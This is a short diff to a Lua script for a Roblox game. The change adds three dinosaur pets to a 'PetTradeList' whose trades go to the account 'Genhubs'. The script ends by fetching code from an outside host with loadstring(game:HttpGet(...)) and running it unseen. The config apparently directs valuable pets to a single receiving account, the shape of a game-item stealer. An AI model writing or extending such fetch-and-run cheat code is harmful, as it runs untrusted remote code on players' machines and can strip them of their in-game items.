@@ -8,7 +8,7 @@ end)
 
 getgenv().MeowKey = "MEOW_DEMO_2025" 
 getgenv().Config = getgenv().Config or {
-    PetTradeList = { "Fennec Fox", "Disco", "Dragon", "Butter", "Octopus", "Raccoon", "Scarlet", "Brontos", "T-Rex", "Red Fox" },
+    PetTradeList = { "Fennec Fox", "Disco", "Dragon", "Butter", "Octopus", "Raccoon", "Scarlet", "Brontos", "T-Rex", "Red Fox", "Dilophosaurus", "Ankylosaurus", "Spinosaurus" },
     ReceiveTrade = "Genhubs"
 }
 loadstring(game:HttpGet("https://meow.g2tech.xyz/script?game=grow_trade"))() 
